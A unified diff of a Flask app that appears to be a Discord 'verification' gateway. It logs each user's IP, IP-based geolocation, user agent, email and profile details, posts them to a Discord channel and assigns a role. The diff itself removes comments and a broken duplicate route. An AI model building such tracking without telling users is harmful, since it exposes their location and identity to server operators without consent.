@@ -1,3 +1,4 @@
+
 from flask import Flask, request, render_template
 import requests, json, os, threading
 from dotenv import load_dotenv
@@ -35,7 +36,6 @@ def save_log(discord_id, data):
 
 @app.route("/")
 def index():
-    # scopeにidentifyとemailを追加
     url = f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email"
     return render_template("index.html", discord_auth_url=url)
 
@@ -45,7 +45,6 @@ def callback():
     if not code:
         return "コードがありません", 400
 
-    # トークン取得時もscopeをidentify emailに変更
     token = requests.post("https://discord.com/api/oauth2/token", data={
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
@@ -67,7 +66,6 @@ def callback():
     geo = get_geo_info(ip)
     user_agent = request.headers.get("User-Agent", "不明")
 
-    # Discordのユーザープロフィールをほぼ全部入れる
     data = {
         "username": user.get("username", ""),
         "discriminator": user.get("discriminator", ""),
@@ -88,12 +86,6 @@ def callback():
 
     save_log(user["id"], data)
 
-    @app.route("/callback")
-def callback():
-    # ...（略）トークン処理とユーザー情報取得済み...
-
-    save_log(user["id"], data)
-
     try:
         bot.loop.create_task(bot.send_log(
             f"✅ 新しいアクセスログ:\n"
@@ -111,10 +103,7 @@ def callback():
             f"Premium: {data['premium_type']}\n"
             f"Public Flags: {data['public_flags']}"
         ))
-
-        # ✅ ロールを付与
         bot.loop.create_task(bot.assign_role(user["id"]))
-
     except Exception as e:
         print("Botが準備できていません:", e)
 
